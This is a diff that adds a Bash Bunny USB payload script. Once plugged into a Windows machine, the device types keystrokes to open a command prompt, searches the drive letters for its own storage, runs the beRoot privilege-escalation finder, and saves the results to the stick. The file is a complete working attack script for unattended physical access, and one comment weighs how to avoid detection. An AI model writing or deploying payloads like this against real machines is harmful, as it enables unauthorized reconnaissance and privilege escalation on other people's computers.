@@ -1,0 +1,35 @@
+# Runs beRoot.exe and gathers results on our Bunny (\_/)
+#					          					  =(o.o)=
+# Artist:	Bry-fi
+LED B 100
+ATTACKMODE HID STORAGE
+Q GUI r
+Q DELAY 200
+Q STRING cmd.exe
+Q DELAY 200
+Q ENTER
+# Scans drives (I have used this method before and will continue to until I figure out how to use the webserver. I am not sure if the webserver is undetected.)
+Q STRING e:
+Q ENTER
+Q DELAY 200
+Q STRING f:
+Q ENTER
+Q DELAY 200
+Q STRING g:
+Q ENTER
+Q DELAY 200
+Q STRING h:
+Q ENTER
+Q DELAY 200
+# Change switch2 to switch1 if you need to.
+Q STRING cd payloads/switch2
+Q ENTER
+Q DELAY 200
+# Writes beRoot in our flash drive
+Q STRING beRoot.exe -w
+Q ENTER
+Q DELAY 200
+Q STRING exit
+Q ENTER
+sync
+LED G
